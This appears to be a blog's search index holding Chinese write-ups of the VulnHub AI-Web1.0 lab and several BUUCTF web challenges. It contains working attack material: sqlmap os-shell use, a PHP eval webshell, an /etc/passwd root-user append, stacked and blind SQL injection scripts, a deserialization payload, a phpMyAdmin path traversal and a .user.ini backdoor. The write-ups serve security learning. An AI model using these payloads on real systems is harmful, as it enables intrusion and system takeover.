<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>vulnhub靶机AI-Web1.0</title>
    <url>/2020/03/20/AI-Web1/</url>
    <content><![CDATA[<p><strong>vulnhub靶机AI-Web1.0</strong><br><strong>知识点：</strong></p>
<blockquote>
<p>sql注入<br>sqlmap拿shell<br>对/etc/passwd 文件写入进行提取</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>扫描靶机ip</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -aP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>扫到靶机ip为192.168.211.145<br><img src="/2020/03/20/AI-Web1/1.png" alt><br>2.扫描靶机开放端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.145</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/2.png" alt><br>发现靶机只开放了80端口，并且扫描到了几个目录，我们先访问一下80端口<br><img src="/2020/03/20/AI-Web1/3.png" alt><br>发现什么都没有，扫描一下网站目录 </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nikto -h <span class="number">192.168</span><span class="number">.211</span><span class="number">.145</span>	#这个并没有什么发现换一个目录</span><br><span class="line">dirb http:<span class="comment">//192.168.211.145/m3diNf0</span></span><br></pre></td></tr></table></figure>

<p>最后发现了一个info.php,并且可以访问<br><img src="/2020/03/20/AI-Web1/8.png" alt><br><img src="/2020/03/20/AI-Web1/7.png" alt></p>
<p>然后访问一下robots.txt,在一次访问一下里面的目录，最后在<a href="http://192.168.211.145/se3reTdir777/下发现一个输入框" target="_blank" rel="noopener">http://192.168.211.145/se3reTdir777/下发现一个输入框</a><br><img src="/2020/03/20/AI-Web1/4.png" alt><br>猜测应该是存在SQL注入，然后测试了一下发现是单引号闭合的SQL注入。直接抓包放到sqlmap里面跑一下，成功</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> -<span class="selector-tag">p</span> uid --dbms mysql --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/5.png" alt><br>最后在systemUser表下发现了几个用户和密码，密码经过base64加密<br><img src="/2020/03/20/AI-Web1/6.png" alt><br>接下来就可以getshell了</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>先 查看mysql的权限</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">sql</span><span class="string">.</span><span class="comment">txt</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">privileg</span>  <span class="literal">-</span><span class="literal">-</span><span class="comment">batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/9.png" alt> FILE权限 可以对服务器本地文件进行操作</p>
<p>尝试使用–os-shell直接得到shell</p>
<p>使用OS_shell的条件<br>（1）具有file权限<br>（2）攻击者需要知道网站的绝对路径<br>（3）GPC为off，php主动转义的功能关闭<br>第一点满足了，绝对路径可从info.php中找到<br>并且我们又发现了一个uploads页面，所以可以</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt --os-<span class="keyword">shell</span><span class="bash"></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/10.png" alt></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">al</span>   发现两个php页面，依次访问，发现一个上传页面，</span><br></pre></td></tr></table></figure>

<p>直接上传一个大马，成功<br><img src="/2020/03/20/AI-Web1/11.png" alt><br>访问，输入密码，很舒服<br><img src="/2020/03/20/AI-Web1/12.png" alt><br>然后反弹shell，再使用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/13.png" alt><br>感觉有点多此一举，其实就是想试试大马 哈哈</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>该用户不是root用户但是该用户可以对/etc/passwd 文件进行写入权限</p>
<p><img src="/2020/03/20/AI-Web1/14.png" alt><br>写入的时候需要加密密码</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">111111</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/15.png" alt></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">'admin123:<span class="variable">$1</span><span class="variable">$admin</span><span class="variable">$2</span>WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash'</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/20/AI-Web1/16.png" alt><br>切换用户后就变味root权限了<br><img src="/2020/03/20/AI-Web1/17.png" alt></p>
<p>这个操作在dc-9和dc-4里面也有相似的</p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-Web</title>
    <url>/2020/03/15/BUU-Web%E4%B8%80/</url>
    <content><![CDATA[<p>BUUCTF-Web笔记</p>
<p>[RoarCTF 2019]Easy Calc<br>知识点：PHP代码审计</p>
<p>[强网杯2019]随便注<br>知识点：堆叠注入</p>
<p>[CISCN2019]Hack World<br>知识点：SQL盲注</p>
<p>[HCTF 2018]admin<br>知识点：Unicode欺骗</p>
<p>[极客大挑战2019]PHP<br>知识点：PHP反序列化</p>
<p>[ACTF2020]BackupFile<br>知识点：PHP代码审计</p>
<p>[GWCTF ]我有-一个数据库<br>知识点：phpMyadmin(CVE-2018-12613)</p>
<p>[极客大挑战2019]Upload<br>知识点：js绕过文件上传</p>
<p>[SUCTF 2019]CheckIn<br>知识点：.user.ini文件上传</p>
<a id="more"></a>

<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>查看元素发现有提示<br><img src="/2020/03/15/BUU-Web%E4%B8%80/1.png" alt></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">calc.php?num=encode<span class="constructor">URIComponent($(<span class="string">"#content"</span>)</span>.<span class="keyword">val</span><span class="literal">()</span>)</span><br><span class="line"></span><br><span class="line"><span class="constructor">$(<span class="string">"#content"</span>)</span>.<span class="keyword">val</span><span class="literal">()</span> 是什么意思：</span><br><span class="line">获取id为content的HTML标签元素的值,是JQuery,     <span class="constructor">$(<span class="string">"#content"</span>)</span>相当于document.get<span class="constructor">ElementById(<span class="string">"content"</span>)</span>;       <span class="constructor">$(<span class="string">"#content"</span>)</span>.<span class="keyword">val</span><span class="literal">()</span>相当于 document.get<span class="constructor">ElementById(<span class="string">"content"</span>)</span>.value;</span><br></pre></td></tr></table></figure>

<p>访问calc.php发现源码<br><img src="/2020/03/15/BUU-Web%E4%B8%80/2.png" alt><br>我们需要绕过黑名单给num传参，然后让eval去执行这个str<br>知识盲区</p>
<p>我们在url传参可以传各种字符，但是php解析字符时要把所有字符全部转化为有效的变量名，因此它会做两件事：1.删除空白符、2.将某些字符转换为下划线（包括空格）</p>
<p>比如说我们传递一个x=a ?x=a，但是waf不允许上传一个非数值型的值。<br>我们就可以通过加空格的方式来绕过，? x=a，这样waf找不到x这个变量，因为现在只有空格 x这个变量，但是当php解析字符串额时候，就会吧空格去掉。</p>
<p>用scandir(/)查看一下目录，/用ascii代替 <code>? num=print_r(scandir(chr(47)))</code>，找到f1agg文件</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/calc.php? num=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">chr</span>(47)</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/3.png" alt></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?num=print_r(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/4.png" alt></p>
<p>参考链接：<a href="https://blog.csdn.net/weixin_42172261/article/details/104454801" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42172261/article/details/104454801</a></p>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>输入单引号报错，存在注入，并且使用#成功闭合。<br><img src="/2020/03/15/BUU-Web%E4%B8%80/5.png" alt><br>使用order by查询字段，有2个字段<br>但是输入select的时候发现一些关键字被过滤<br><img src="/2020/03/15/BUU-Web%E4%B8%80/6.png" alt><br>过滤了许多关键字，可以考虑下堆叠注入<br><strong><em>堆叠注入原理</em></strong>:</p>
<blockquote>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。<br> 用户输入：1; DELETE FROM products<br> 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products<br> 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
</blockquote>
<p>输入<code>1&#39;;show databases;#</code> 成功回显,说明存在堆叠注入<br><img src="/2020/03/15/BUU-Web%E4%B8%80/17.png" alt><br>查询表<br>输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/18.png" alt>查询表中的列<br><strong>mysql中点引号( ‘ )和反勾号( ` )的区别</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别:</span><br><span class="line">单引号( ' )或双引号主要用于字符串的引用符号</span><br><span class="line">eg：mysql&gt; SELECT <span class="symbol">'hello</span>', <span class="string">"hello"</span> ;</span><br><span class="line"></span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]</span><br><span class="line">eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = <span class="symbol">'abc</span>' ;</span><br></pre></td></tr></table></figure>

<p>输入<code>1&#39;; show columns from</code>1919810931114514<code>; #</code>   字段使用的是反勾号（ `` <code>）
![](19.png)既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
 先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。
 payload:
 1&#39;;RENAME TABLE</code>words<code>TO</code>words1<code>;RENAME TABLE</code>1919810931114514<code>TO</code>words<code>;ALTER TABLE</code>words<code>CHANGE</code>flag<code></code>id<code>VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p>
<p>然后输入 <code>1&#39; or 1=1#</code>便能得到flag<br><img src="/2020/03/15/BUU-Web%E4%B8%80/20.png" alt></p>
<h1 id="CISCN2019-Hack-World"><a href="#CISCN2019-Hack-World" class="headerlink" title="[CISCN2019]Hack World"></a>[CISCN2019]Hack World</h1><p><img src="/2020/03/15/BUU-Web%E4%B8%80/7.png" alt></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入<span class="number">1</span>时:返回Hello, glzjin wants a girlfriend.</span><br><span class="line">输入<span class="number">2</span>时:Do you want to be my girlfriend?</span><br><span class="line">输入<span class="number">1</span>%<span class="number">2</span>时也会回显:Hello, glzjin wants a girlfriend.</span><br><span class="line">输入其他数值时返回error</span><br></pre></td></tr></table></figure>

<p>然后题目提示flag在flag中，告诉我们flag的位置，猜测应该是想让我们吧flag读出来，但是测试后发现过滤了很多关键字and&amp;&amp;、 or||、 空格 、# 、for、limit ，所以我们尝试使用盲注<br>先尝试一下布尔盲注</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">ascii</span>(<span class="name">substr</span>((<span class="name">select</span>(<span class="name">flag</span>)from(<span class="name">flag</span>)),<span class="number">1</span>,<span class="number">1</span>))=102,<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/8.png" alt><br>我们现在知道当回显正确时会显示hello，不正确时则不会显示<br>于是我们构造一个脚本跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url=<span class="string">'http://14965e14-e479-403d-a1b1-8cc427584c10.node3.buuoj.cn/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j);</span><br><span class="line">        data = &#123;</span><br><span class="line">	    <span class="string">"id"</span>:payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)  <span class="comment">#发包</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:		<span class="comment">#判断是否正确回显</span></span><br><span class="line">            x = chr(j)</span><br><span class="line">            result+=str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/9.png" alt><br>时间盲注<br>payload</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">ascii</span>(<span class="name">substr</span>((<span class="name">select</span>(<span class="name">flag</span>)from(<span class="name">flag</span>)),<span class="number">1</span>,<span class="number">1</span>))=102,sleep(<span class="number">3</span>),<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url=<span class="string">'http://14965e14-e479-403d-a1b1-8cc427584c10.node3.buuoj.cn/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        ss = time.time()</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",sleep(3),2)"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">	    <span class="string">"id"</span>:payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time.time() - ss&gt;=<span class="number">0.5</span>:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result+=str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/10.png" alt><br>也是能跑出来的，只不过要慢很多</p>
<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>Unicode欺骗:</p>
<p>进入题目，发现是一个登录框，并且可以注册。<br>先随便注册一个账号，登陆后查看源码发现提示<code>you are not admin</code>应该是想让我们一管理员的身份登陆<br><img src="/2020/03/15/BUU-Web%E4%B8%80/11.png" alt><br>然后又发现在修改密码界面查看源码给出了一个网址，猜测应该是源码<br><img src="/2020/03/15/BUU-Web%E4%B8%80/12.png" alt><br>下载后发现是用flask写的，然后直接打开route.py<br>然后发现在修改密码的时候先将name转成小写，应该是在登陆的时候没有转,并且register、login也使用的strlower函数<br><img src="/2020/03/15/BUU-Web%E4%B8%80/13.png" alt><br>查看一下strlower函数<br><img src="/2020/03/15/BUU-Web%E4%B8%80/14.png" alt><br>发现用的nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞<br><img src="/2020/03/15/BUU-Web%E4%B8%80/15.png" alt><br>ᴬᴰᴹᴵᴺ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> nodeprep.prepare(name)</span><br><span class="line">print(<span class="string">u'\u1d2c\u1d30\u1d39\u1d35\u1d3a'</span>)</span><br><span class="line">print(test(<span class="string">u'\u1d2c\u1d30\u1d39\u1d35\u1d3A'</span>))</span><br><span class="line">print(test(test(<span class="string">u'\u1d2c\u1d30\u1d39\u1d35\u1d3A'</span>)))</span><br></pre></td></tr></table></figure>

<p>然后我们发现在使用nodeprep.prepare函数转换时过程如下：</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure>

<p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。<br><img src="/2020/03/15/BUU-Web%E4%B8%80/16.png" alt></p>
<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>进入题目后，提示有备份文件<br><img src="/2020/03/15/BUU-Web%E4%B8%80/22.png" alt><br>使用dirsearch扫描发现备份文件为<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python dirsearch<span class="selector-class">.py</span> -u http:<span class="comment">//42ef7809-965a-4bc8-a0c9-95356304638f.node3.buuoj.cn/ -e php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/23.png" alt><br>下载后打开里面的index.php 发现包含class.php并且有一个GET传参,然后打开class.php 进行审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">$select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果password=100，username=admin，在调用__destruct()时就可以获得flag，因此我们需要构造一个序列化使得password=100，username=admin</p>
<p>得到序列化后的结合</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>绕过__wakeup()</p>
<p>__wakeup()方法中$this-&gt;username =  ‘guest’会让username重新赋值。在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过  __wakeup()函数的执行，我们可以将字符串中O:4:”Name”后面的2改为3及以上的整数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>该类中使用的private来声明字段，private在序列化中类名和字段名前都要加上ASCII 码为 0 的字符(不可见字符)，如果我们直接复制结果，该空白字符会丢失，需要我们自己加上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>使用select传参后便得到flag</p>
<p><img src="/2020/03/15/BUU-Web%E4%B8%80/24.png" alt></p>
<h1 id="ACTF2020-BackupFile"><a href="#ACTF2020-BackupFile" class="headerlink" title="[ACTF2020]BackupFile"></a>[ACTF2020]BackupFile</h1><p>题目为备份文件，打开后先访问index.php.bak发现备份文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>浏览一遍后，Get传参key，当key=$str时即可得到flag，但是key只能是数字，str为字符串，于是要想办法绕过。</p>
<p>简单的弱类型绕过：<br>php中两个等于号是弱等于，PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉，所以相当于key只要等于123就满足条件了</p>
<p><img src="/2020/03/15/BUU-Web%E4%B8%80/25.png" alt></p>
<h1 id="GWCTF-我有一个数据库"><a href="#GWCTF-我有一个数据库" class="headerlink" title="[GWCTF ]我有一个数据库"></a>[GWCTF ]我有一个数据库</h1><p>打开后什么都没有，扫后台发现PHPmyadmin，于是想到phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞<br>网上查找了一下payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/phpmyadmin/</span>?target=db_datadict.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/26.png" alt><br>然后直接尝试读取/flag</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/phpmyadmin/</span>?target=db_datadict.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>文件类型绕过<br>常用一句话：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[shell])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php5适用<br>该题检查了文件后缀，文件类型，并且还检查了内容，不能包含<code>&lt;?</code>。文件后缀我们可以使用phtml绕过，文件内容就使用上面的JavaScript语句绕过。并且修改类型为image/jpeg.<br><img src="/2020/03/15/BUU-Web%E4%B8%80/27.png" alt><br>然后用蚁剑连接 便可以了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>f2c27912-fe18-<span class="number">4713</span>-a183-f00430b062b4.node3.buuoj.cn<span class="regexp">/upload/yi</span>jvhua.phtml</span><br></pre></td></tr></table></figure>

<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>这个题是个文件上传的题。<br>先上传一张图片马，但是检测了文件内容<br><img src="/2020/03/15/BUU-Web%E4%B8%80/28.png" alt><br>我们可以使用</p>
<blockquote>
<p>GIF89a? undefinedundefined&lt;script language=”php”&gt;eval($_REQUEST[shell])&lt;/script&gt;</p>
</blockquote>
<p>来绕过，刚好也检查了文件头。<br><img src="/2020/03/15/BUU-Web%E4%B8%80/29.png" alt><br>成功上传，但是没办法利用。百度后发现了一个新方法，我们可以利用<code>.user.ini</code>来上传php后门</p>
<p>大致的原理：<br>我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>操作的方法跟<code>.hteccess</code>有点相似。<br>其中auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
<p>我们可以上传一个这样的<code>.user.ini</code>：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=<span class="keyword">shell</span>.<span class="bash">jpg</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>echo ‘GIF89a  auto_prepend_file=a.jpg’ &gt; .user.ini</p>
</blockquote>
<p>然后再上传我们的图片马a.jpg</p>
